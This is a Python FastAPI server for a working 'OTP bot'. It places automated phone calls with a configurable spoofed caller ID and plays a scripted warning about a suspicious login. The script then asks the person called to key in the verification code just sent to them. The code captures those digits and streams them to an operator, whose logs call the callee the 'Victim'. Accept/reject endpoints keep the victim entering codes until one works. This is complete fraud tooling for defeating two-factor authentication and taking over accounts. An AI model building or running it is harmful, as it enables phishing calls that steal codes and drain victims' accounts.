from fastapi import FastAPI, APIRouter, HTTPException, Depends, status, Request
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict, EmailStr
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone, timedelta
import httpx
import jwt
from passlib.context import CryptContext
import socketio
import asyncio
import json

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Infobip configuration
INFOBIP_API_KEY = os.environ.get('INFOBIP_API_KEY')
INFOBIP_BASE_URL = os.environ.get('INFOBIP_BASE_URL', 'qdnddq.api.infobip.com')
INFOBIP_CALLS_CONFIG_ID = os.environ.get('INFOBIP_CALLS_CONFIG_ID')

# Webhook base URL
WEBHOOK_BASE_URL = "https://ivrsession.preview.emergentagent.com/api"

# JWT configuration
JWT_SECRET_KEY = os.environ.get('JWT_SECRET_KEY', 'default_secret')
JWT_ALGORITHM = os.environ.get('JWT_ALGORITHM', 'HS256')
ACCESS_TOKEN_EXPIRE_MINUTES = int(os.environ.get('ACCESS_TOKEN_EXPIRE_MINUTES', 1440))

# Password hashing
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
security = HTTPBearer()

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Socket.IO for real-time updates
sio = socketio.AsyncServer(async_mode='asgi', cors_allowed_origins='*')

# Create FastAPI app
fastapi_app = FastAPI(title="OTP Bot Call API", version="2.0.0")

# Create Socket.IO ASGI app - this wraps FastAPI
app = socketio.ASGIApp(sio, fastapi_app)

# Store active sessions - key is call_id for faster lookup
active_sessions: Dict[str, Dict[str, Any]] = {}
call_to_session: Dict[str, str] = {}  # call_id -> session_id mapping

# Create routers
api_router = APIRouter(prefix="/api")
auth_router = APIRouter(prefix="/auth", tags=["Authentication"])
voice_router = APIRouter(prefix="/voice", tags=["Voice Calls"])
otp_router = APIRouter(prefix="/otp", tags=["OTP Bot"])

# ==================== MODELS ====================

class UserCreate(BaseModel):
    email: EmailStr
    password: str
    name: str

class UserLogin(BaseModel):
    email: EmailStr
    password: str

class UserResponse(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str
    email: str
    name: str
    created_at: str

class TokenResponse(BaseModel):
    access_token: str
    token_type: str = "bearer"
    user: UserResponse

class OTPCallConfig(BaseModel):
    recipient_number: str = Field(..., description="Target phone number")
    caller_id: str = Field(default="+14245298701", description="Display caller ID")
    recipient_name: str = Field(default="User", description="Name for greeting")
    service_name: str = Field(default="Account", description="Service name")
    otp_digits: int = Field(default=6, description="Expected OTP digit count")
    language: str = Field(default="en", description="Language code")
    
    step1_message: str = Field(
        default="Hello {name}, we have detected a login attempt to your {service} account from a new device or location. If you did not recognize this request, please press 1. If this was you, press 0 to approve.",
        description="Step 1 greeting message"
    )
    step2_message: str = Field(
        default="Alright, we just sent a {digits} digit verification code to your number. If you received it, could you please enter it using your dial pad?",
        description="Step 2 OTP request message"
    )
    step3_message: str = Field(
        default="Okay, please wait a moment while we verify the code.",
        description="Step 3 verification message"
    )
    accepted_message: str = Field(
        default="Okay! We've declined the sign-in request, and your account is safe. Thanks for your time. Have a nice day!",
        description="Accepted/End message"
    )
    rejected_message: str = Field(
        default="I'm sorry, but the code you entered is incorrect. Could you please enter it again?",
        description="Rejected/Retry message"
    )

# ==================== AUTH HELPERS ====================

def hash_password(password: str) -> str:
    return pwd_context.hash(password)

def verify_password(plain_password: str, hashed_password: str) -> bool:
    return pwd_context.verify(plain_password, hashed_password)

def create_access_token(data: dict) -> str:
    to_encode = data.copy()
    expire = datetime.now(timezone.utc) + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)

async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    token = credentials.credentials
    try:
        payload = jwt.decode(token, JWT_SECRET_KEY, algorithms=[JWT_ALGORITHM])
        user_id = payload.get("sub")
        if user_id is None:
            raise HTTPException(status_code=401, detail="Invalid token")
        
        user = await db.users.find_one({"id": user_id}, {"_id": 0})
        if user is None:
            raise HTTPException(status_code=401, detail="User not found")
        return user
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.PyJWTError:
        raise HTTPException(status_code=401, detail="Invalid token")

# ==================== SOCKET.IO EVENTS ====================

@sio.event
async def connect(sid, environ):
    logger.info(f"Client connected: {sid}")

@sio.event
async def disconnect(sid):
    logger.info(f"Client disconnected: {sid}")

@sio.event
async def join_session(sid, data):
    session_id = data.get('session_id')
    if session_id:
        await sio.enter_room(sid, session_id)
        logger.info(f"Client {sid} joined session {session_id}")

async def emit_log(session_id: str, log_type: str, message: str, data: dict = None):
    """Emit log event to all clients in a session"""
    timestamp = datetime.now(timezone.utc).strftime("%H:%M:%S")
    log_entry = {
        "timestamp": timestamp,
        "type": log_type,
        "message": message,
        "data": data or {}
    }
    
    # Store log in database
    await db.otp_sessions.update_one(
        {"id": session_id},
        {"$push": {"logs": log_entry}}
    )
    
    # Emit to connected clients
    await sio.emit('call_log', log_entry, room=session_id)
    await sio.emit('session_update', {"session_id": session_id, "log": log_entry})
    logger.info(f"[{session_id}] {log_type}: {message}")

# ==================== INFOBIP CALLS API HELPERS ====================

def get_infobip_headers():
    return {
        "Authorization": f"App {INFOBIP_API_KEY}",
        "Content-Type": "application/json",
        "Accept": "application/json"
    }

def get_infobip_url(path: str) -> str:
    base = INFOBIP_BASE_URL if INFOBIP_BASE_URL.startswith('http') else f"https://{INFOBIP_BASE_URL}"
    return f"{base}{path}"

async def infobip_request(method: str, path: str, data: dict = None) -> dict:
    """Make request to Infobip API"""
    url = get_infobip_url(path)
    headers = get_infobip_headers()
    
    async with httpx.AsyncClient(timeout=30.0) as http_client:
        if method == "POST":
            response = await http_client.post(url, headers=headers, json=data)
        elif method == "GET":
            response = await http_client.get(url, headers=headers)
        else:
            raise ValueError(f"Unsupported method: {method}")
        
        logger.info(f"Infobip {method} {path}: {response.status_code}")
        
        try:
            resp_data = response.json() if response.text else {}
        except:
            resp_data = {"raw": response.text}
            
        return {"status_code": response.status_code, "data": resp_data}

async def create_outbound_call(to_number: str, from_number: str) -> dict:
    """Create outbound call using Calls API"""
    payload = {
        "endpoint": {
            "type": "PHONE",
            "phoneNumber": to_number
        },
        "from": from_number,
        "callsConfigurationId": INFOBIP_CALLS_CONFIG_ID
    }
    
    return await infobip_request("POST", "/calls/1/calls", payload)

async def play_tts(call_id: str, text: str, language: str = "en"):
    """Play TTS on active call"""
    payload = {
        "text": text,
        "language": language
    }
    logger.info(f"Playing TTS on {call_id}: {text[:50]}...")
    return await infobip_request("POST", f"/calls/1/calls/{call_id}/say", payload)

async def start_dtmf_capture(call_id: str, max_length: int, timeout: int = 30):
    """Start capturing DTMF digits"""
    payload = {
        "maxLength": max_length,
        "timeout": timeout
    }
    logger.info(f"Starting DTMF capture on {call_id}, max_length={max_length}")
    return await infobip_request("POST", f"/calls/1/calls/{call_id}/capture/dtmf", payload)

async def stop_dtmf_capture(call_id: str):
    """Stop capturing DTMF"""
    return await infobip_request("POST", f"/calls/1/calls/{call_id}/capture/dtmf/stop", {})

async def hangup_call(call_id: str):
    """Hangup the call"""
    return await infobip_request("POST", f"/calls/1/calls/{call_id}/hangup", {})

async def get_call_status(call_id: str) -> dict:
    """Get call status from Infobip"""
    return await infobip_request("GET", f"/calls/1/calls/{call_id}")

async def wait_and_play_step1(session_id: str, session: dict, call_id: str):
    """Wait for call to be established then play Step 1"""
    try:
        # Wait for call to be answered (poll status)
        max_attempts = 30  # 30 seconds max wait
        for attempt in range(max_attempts):
            await asyncio.sleep(1)
            
            # Check call status
            result = await get_call_status(call_id)
            if result["status_code"] == 200:
                call_state = result["data"].get("state", "")
                logger.info(f"Call {call_id} state: {call_state}")
                
                if call_state == "ESTABLISHED":
                    # Call answered - play Step 1
                    await emit_log(session_id, "success", "✅ Call Answered")
                    
                    # Update status
                    await db.otp_sessions.update_one(
                        {"id": session_id},
                        {"$set": {"status": "step1", "current_step": 1}}
                    )
                    active_sessions[session_id]["current_step"] = 1
                    active_sessions[session_id]["status"] = "step1"
                    
                    # Play Step 1 greeting
                    await emit_log(session_id, "step", "🎙️ Playing Step 1 message...")
                    step1_text = session["messages"]["step1"]
                    tts_result = await play_tts(call_id, step1_text, session.get("language", "en"))
                    logger.info(f"TTS Step 1 result: {tts_result}")
                    
                    # Wait for TTS to finish then start DTMF capture
                    await asyncio.sleep(10)  # Wait for TTS
                    await emit_log(session_id, "info", "⏳ Waiting for user input (1 or 0)...")
                    await start_dtmf_capture(call_id, max_length=1, timeout=30)
                    return
                    
                elif call_state in ["FINISHED", "FAILED", "HANGUP"]:
                    await emit_log(session_id, "info", f"📴 Call ended: {call_state}")
                    await db.otp_sessions.update_one(
                        {"id": session_id},
                        {"$set": {"status": "completed"}}
                    )
                    return
                    
        logger.warning(f"Call {call_id} did not connect after {max_attempts} attempts")
        await emit_log(session_id, "warning", "⏱️ Call not answered - timeout")
        
    except Exception as e:
        logger.error(f"Error in wait_and_play_step1: {e}", exc_info=True)

# ==================== AUTH ROUTES ====================

@auth_router.post("/register", response_model=TokenResponse)
async def register(user_data: UserCreate):
    existing_user = await db.users.find_one({"email": user_data.email})
    if existing_user:
        raise HTTPException(status_code=400, detail="Email already registered")
    
    user_id = str(uuid.uuid4())
    now = datetime.now(timezone.utc).isoformat()
    
    user_doc = {
        "id": user_id,
        "email": user_data.email,
        "name": user_data.name,
        "password_hash": hash_password(user_data.password),
        "created_at": now
    }
    
    await db.users.insert_one(user_doc)
    access_token = create_access_token({"sub": user_id})
    
    return TokenResponse(
        access_token=access_token,
        user=UserResponse(id=user_id, email=user_data.email, name=user_data.name, created_at=now)
    )

@auth_router.post("/login", response_model=TokenResponse)
async def login(credentials: UserLogin):
    user = await db.users.find_one({"email": credentials.email}, {"_id": 0})
    if not user or not verify_password(credentials.password, user["password_hash"]):
        raise HTTPException(status_code=401, detail="Invalid email or password")
    
    access_token = create_access_token({"sub": user["id"]})
    
    return TokenResponse(
        access_token=access_token,
        user=UserResponse(id=user["id"], email=user["email"], name=user["name"], created_at=user["created_at"])
    )

@auth_router.get("/me", response_model=UserResponse)
async def get_me(current_user: dict = Depends(get_current_user)):
    return UserResponse(
        id=current_user["id"],
        email=current_user["email"],
        name=current_user["name"],
        created_at=current_user["created_at"]
    )

# ==================== OTP BOT ROUTES ====================

@otp_router.post("/initiate-call")
async def initiate_otp_call(config: OTPCallConfig, current_user: dict = Depends(get_current_user)):
    """Initiate an OTP bot call"""
    
    session_id = str(uuid.uuid4())
    now = datetime.now(timezone.utc).isoformat()
    
    # Format messages
    step1_text = config.step1_message.replace("{name}", config.recipient_name).replace("{service}", config.service_name)
    step2_text = config.step2_message.replace("{digits}", str(config.otp_digits))
    rejected_text = config.rejected_message.replace("{digits}", str(config.otp_digits))
    
    # Create session
    session_doc = {
        "id": session_id,
        "user_id": current_user["id"],
        "recipient_number": config.recipient_number,
        "caller_id": config.caller_id,
        "recipient_name": config.recipient_name,
        "service_name": config.service_name,
        "otp_digits": config.otp_digits,
        "language": config.language,
        "status": "initiating",
        "current_step": 0,
        "call_id": None,
        "first_input": None,
        "otp_received": None,
        "otp_digits_collected": "",
        "created_at": now,
        "logs": [],
        "messages": {
            "step1": step1_text,
            "step2": step2_text,
            "step3": config.step3_message,
            "accepted": config.accepted_message,
            "rejected": rejected_text
        }
    }
    
    await db.otp_sessions.insert_one(session_doc)
    
    await emit_log(session_id, "info", "🤖 Generating AI voices...")
    await emit_log(session_id, "call", f"🚦 Call initiated")
    
    try:
        # Create outbound call
        result = await create_outbound_call(config.recipient_number, config.caller_id)
        
        if result["status_code"] in [200, 201]:
            call_data = result["data"]
            call_id = call_data.get("id")
            
            # Store mappings
            call_to_session[call_id] = session_id
            active_sessions[session_id] = {**session_doc, "call_id": call_id}
            
            await db.otp_sessions.update_one(
                {"id": session_id},
                {"$set": {"call_id": call_id, "status": "calling"}}
            )
            
            await emit_log(session_id, "info", f"📞 Calling...")
            
            # Start background task to play TTS after call is established
            # This handles the case where webhook doesn't arrive
            asyncio.create_task(wait_and_play_step1(session_id, session_doc, call_id))
            
            return {
                "session_id": session_id,
                "call_id": call_id,
                "status": "calling"
            }
        else:
            error_msg = result["data"].get("requestError", {}).get("serviceException", {}).get("text", "Unknown error")
            await emit_log(session_id, "error", f"❌ Failed: {error_msg}")
            raise HTTPException(status_code=500, detail=error_msg)
            
    except Exception as e:
        await emit_log(session_id, "error", f"❌ Error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@otp_router.post("/webhook/call-events")
async def handle_call_events(request: Request):
    """Handle all Infobip call events"""
    try:
        body = await request.json()
        logger.info(f"📞 Webhook received: {json.dumps(body, indent=2)}")
        
        call_id = body.get("callId") or body.get("id")
        event_type = body.get("type", "UNKNOWN")
        
        # Find session
        session_id = call_to_session.get(call_id)
        if not session_id:
            # Try from database
            session = await db.otp_sessions.find_one({"call_id": call_id}, {"_id": 0})
            if session:
                session_id = session["id"]
                call_to_session[call_id] = session_id
                active_sessions[session_id] = session
        
        if not session_id:
            logger.warning(f"No session for call {call_id}")
            return {"status": "no_session"}
        
        # Always get fresh session from database
        session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
        if not session:
            return {"status": "session_not_found"}
        
        # Update active session cache
        active_sessions[session_id] = session
        
        # Handle events
        if event_type == "CALL_RINGING":
            await emit_log(session_id, "info", "📱 Ringing...")
            
        elif event_type == "CALL_ESTABLISHED":
            await emit_log(session_id, "success", "✅ Call Answered")
            
            # Update status
            await db.otp_sessions.update_one(
                {"id": session_id},
                {"$set": {"status": "step1", "current_step": 1}}
            )
            active_sessions[session_id]["current_step"] = 1
            active_sessions[session_id]["status"] = "step1"
            
            # Play Step 1 greeting and start DTMF capture in background
            asyncio.create_task(play_step1_and_capture(session_id, session, call_id))
            
        elif event_type == "CALL_FINISHED":
            reason = body.get("errorCode", {}).get("name", "completed")
            await emit_log(session_id, "info", f"📴 Call ended: {reason}")
            await db.otp_sessions.update_one(
                {"id": session_id},
                {"$set": {"status": "completed"}}
            )
            # Cleanup
            if call_id in call_to_session:
                del call_to_session[call_id]
            if session_id in active_sessions:
                del active_sessions[session_id]
                
        elif event_type == "CALL_FAILED":
            error = body.get("errorCode", {}).get("description", "Unknown")
            await emit_log(session_id, "error", f"❌ Call failed: {error}")
            await db.otp_sessions.update_one(
                {"id": session_id},
                {"$set": {"status": "failed"}}
            )
            
        elif event_type == "SAY_FINISHED":
            # TTS finished - check if we need to start DTMF capture
            logger.info(f"TTS finished on {call_id}")
            await handle_say_finished(session_id, session, call_id)
            
        elif event_type == "DTMF_CAPTURED":
            # Handle both expected and unexpected DTMF
            dtmf_value = body.get("dtmf", "")
            capture_requested = body.get("captureRequested", True)
            logger.info(f"DTMF_CAPTURED: {dtmf_value}, captureRequested: {capture_requested}")
            if dtmf_value:
                await handle_dtmf(session_id, session, call_id, dtmf_value)
            
        elif event_type == "CAPTURE_FINISHED":
            # DTMF capture timeout or finished
            dtmf_value = body.get("dtmf", "")
            logger.info(f"CAPTURE_FINISHED: dtmf={dtmf_value}")
            if dtmf_value:
                await handle_dtmf(session_id, session, call_id, dtmf_value)
        
        return {"status": "processed"}
        
    except Exception as e:
        logger.error(f"Webhook error: {e}", exc_info=True)
        return {"status": "error", "message": str(e)}

async def play_step1_and_capture(session_id: str, session: dict, call_id: str):
    """Play Step 1 greeting and start DTMF capture"""
    try:
        await emit_log(session_id, "step", "🎙️ Playing Step 1 message...")
        step1_text = session["messages"]["step1"]
        await play_tts(call_id, step1_text, session.get("language", "en"))
        # Note: DTMF capture will be started after SAY_FINISHED event
    except Exception as e:
        logger.error(f"Error in play_step1_and_capture: {e}")

async def handle_say_finished(session_id: str, session: dict, call_id: str):
    """Handle SAY_FINISHED event - start appropriate DTMF capture"""
    try:
        # Refresh session from DB to get current step
        session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
        if not session:
            return
            
        current_step = session.get("current_step", 1)
        status = session.get("status", "")
        otp_digits = session.get("otp_digits", 6)
        
        logger.info(f"SAY_FINISHED: current_step={current_step}, status={status}")
        
        if current_step == 1 and status == "step1":
            # After Step 1 message, capture 1 digit choice
            await emit_log(session_id, "info", "⏳ Waiting for user input (1 or 0)...")
            await start_dtmf_capture(call_id, max_length=1, timeout=30)
            
        elif current_step == 2 and status == "step2":
            # After Step 2 message, capture OTP digits
            await emit_log(session_id, "info", f"⏳ Waiting for {otp_digits}-digit OTP...")
            await start_dtmf_capture(call_id, max_length=otp_digits, timeout=60)
            
    except Exception as e:
        logger.error(f"Error in handle_say_finished: {e}")

async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: str):
    """Handle DTMF input based on current step"""
    # Always get fresh session from database to ensure we have current step
    fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if fresh_session:
        session = fresh_session
        active_sessions[session_id] = session
    
    current_step = session.get("current_step", 1)
    status = session.get("status", "step1")
    otp_digits = session.get("otp_digits", 6)
    
    logger.info(f"handle_dtmf: dtmf={dtmf_value}, current_step={current_step}, status={status}")
    
    if current_step == 1 and status in ["step1", "calling"]:
        # Step 1: User pressed 1 or 0
        first_digit = dtmf_value[0] if dtmf_value else ""
        await emit_log(session_id, "warning", f"⚠️ Victim Pressed {first_digit} - Send OTP Now!")
        
        # Update to step 2
        await db.otp_sessions.update_one(
            {"id": session_id},
            {"$set": {"first_input": first_digit, "current_step": 2, "status": "step2", "otp_digits_collected": ""}}
        )
        active_sessions[session_id]["current_step"] = 2
        active_sessions[session_id]["status"] = "step2"
        active_sessions[session_id]["first_input"] = first_digit
        active_sessions[session_id]["otp_digits_collected"] = ""
        
        # Play Step 2 - OTP request
        await emit_log(session_id, "step", "🎙️ Playing Step 2: OTP Request...")
        step2_text = session["messages"]["step2"]
        result = await play_tts(call_id, step2_text, session.get("language", "en"))
        logger.info(f"Step 2 TTS result: {result}")
        # DTMF capture will be started after SAY_FINISHED event
        
    elif current_step == 2 and status == "step2":
        # Step 2: Collecting OTP digits
        otp_code = dtmf_value.replace("#", "").replace("*", "")
        
        if len(otp_code) >= otp_digits:
            otp_code = otp_code[:otp_digits]
        
        await emit_log(session_id, "otp", f"🔑 OTP Captured: {otp_code}", {"otp": otp_code})
        
        # Update to step 3
        await db.otp_sessions.update_one(
            {"id": session_id},
            {"$set": {"otp_received": otp_code, "current_step": 3, "status": "waiting_approval"}}
        )
        active_sessions[session_id]["current_step"] = 3
        active_sessions[session_id]["status"] = "waiting_approval"
        active_sessions[session_id]["otp_received"] = otp_code
        
        # Play Step 3 - Verification wait
        await emit_log(session_id, "step", "🎙️ Playing Step 3: Verification Wait...")
        step3_text = session["messages"]["step3"]
        await play_tts(call_id, step3_text, session.get("language", "en"))
        
        await emit_log(session_id, "action", "⏳ Waiting for admin approval...")
        
    else:
        logger.warning(f"Unexpected DTMF: dtmf={dtmf_value}, step={current_step}, status={status}")

@otp_router.post("/accept/{session_id}")
async def accept_otp(session_id: str, current_user: dict = Depends(get_current_user)):
    """Admin accepts the OTP - play accepted message"""
    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    
    call_id = session.get("call_id")
    if not call_id:
        raise HTTPException(status_code=400, detail="No active call")
    
    await emit_log(session_id, "action", "✅ Admin pressed ACCEPT")
    
    # Play accepted message
    accepted_text = session["messages"]["accepted"]
    await emit_log(session_id, "step", "🎙️ Playing Accepted message...")
    await play_tts(call_id, accepted_text, session.get("language", "en"))
    
    # Wait then hangup
    await asyncio.sleep(6)
    await hangup_call(call_id)
    
    await emit_log(session_id, "success", "📴 Call completed successfully")
    
    await db.otp_sessions.update_one(
        {"id": session_id},
        {"$set": {"status": "completed", "result": "accepted"}}
    )
    
    return {"status": "accepted", "otp": session.get("otp_received")}

@otp_router.post("/reject/{session_id}")
async def reject_otp(session_id: str, current_user: dict = Depends(get_current_user)):
    """Admin rejects the OTP - play retry message"""
    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    
    call_id = session.get("call_id")
    if not call_id:
        raise HTTPException(status_code=400, detail="No active call")
    
    otp_digits = session.get("otp_digits", 6)
    
    await emit_log(session_id, "action", "❌ Admin pressed REJECT")
    
    # Play rejected message
    rejected_text = session["messages"]["rejected"]
    await emit_log(session_id, "step", "🎙️ Playing Retry message...")
    await play_tts(call_id, rejected_text, session.get("language", "en"))
    
    # Update back to step 2
    await db.otp_sessions.update_one(
        {"id": session_id},
        {"$set": {"status": "step2", "current_step": 2, "otp_received": None}}
    )
    active_sessions[session_id] = {**session, "current_step": 2, "status": "step2", "otp_received": None}
    
    # Wait for TTS then capture new OTP
    await asyncio.sleep(5)
    await start_dtmf_capture(call_id, max_length=otp_digits, timeout=60)
    
    await emit_log(session_id, "info", "🔄 Waiting for new OTP input...")
    
    return {"status": "rejected"}

@otp_router.post("/hangup/{session_id}")
async def hangup_session(session_id: str, current_user: dict = Depends(get_current_user)):
    """Manually hangup the call"""
    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    
    call_id = session.get("call_id")
    if call_id:
        await hangup_call(call_id)
        await emit_log(session_id, "info", "📴 Call ended by admin")
    
    await db.otp_sessions.update_one(
        {"id": session_id},
        {"$set": {"status": "completed"}}
    )
    
    return {"status": "hangup"}

@otp_router.get("/session/{session_id}")
async def get_otp_session(session_id: str, current_user: dict = Depends(get_current_user)):
    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    return session

@otp_router.get("/sessions")
async def get_otp_sessions(current_user: dict = Depends(get_current_user)):
    sessions = await db.otp_sessions.find(
        {"user_id": current_user["id"]},
        {"_id": 0}
    ).sort("created_at", -1).limit(50).to_list(50)
    return sessions

# ==================== VOICE ROUTES ====================

@voice_router.get("/history")
async def get_call_history(limit: int = 50, skip: int = 0, current_user: dict = Depends(get_current_user)):
    calls = await db.calls.find({"user_id": current_user["id"]}, {"_id": 0}).sort("created_at", -1).skip(skip).limit(limit).to_list(limit)
    return calls

@voice_router.get("/stats")
async def get_call_stats(current_user: dict = Depends(get_current_user)):
    # Count OTP sessions as calls
    pipeline = [
        {"$match": {"user_id": current_user["id"]}},
        {"$group": {
            "_id": None,
            "total_calls": {"$sum": 1},
            "completed_calls": {"$sum": {"$cond": [{"$eq": ["$status", "completed"]}, 1, 0]}},
            "failed_calls": {"$sum": {"$cond": [{"$eq": ["$status", "failed"]}, 1, 0]}},
            "pending_calls": {"$sum": {"$cond": [{"$in": ["$status", ["calling", "step1", "step2", "waiting_approval"]]}, 1, 0]}}
        }}
    ]
    
    result = await db.otp_sessions.aggregate(pipeline).to_list(1)
    
    if result:
        stats = result[0]
        return {
            "total_calls": stats["total_calls"],
            "completed_calls": stats["completed_calls"],
            "failed_calls": stats["failed_calls"],
            "pending_calls": stats["pending_calls"],
            "total_duration": 0,
            "avg_duration": 0
        }
    
    return {"total_calls": 0, "completed_calls": 0, "failed_calls": 0, "pending_calls": 0, "total_duration": 0, "avg_duration": 0}

# ==================== MAIN ROUTES ====================

@api_router.get("/")
async def root():
    return {"message": "OTP Bot Call API v2.0 - Calls API Enabled"}

@api_router.get("/health")
async def health_check():
    return {"status": "healthy", "service": "otp-bot-api", "calls_api": "enabled"}

# Include routers
api_router.include_router(auth_router)
api_router.include_router(voice_router)
api_router.include_router(otp_router)
fastapi_app.include_router(api_router)

# CORS middleware
fastapi_app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

@fastapi_app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
